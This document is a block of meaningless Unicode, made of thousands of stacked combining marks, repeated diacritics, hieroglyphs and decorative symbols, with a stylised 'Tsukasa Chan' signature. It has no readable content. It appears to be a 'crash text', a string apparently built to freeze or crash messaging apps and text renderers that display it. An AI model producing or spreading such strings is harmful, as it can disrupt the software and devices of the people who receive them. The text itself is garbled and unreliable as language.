⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙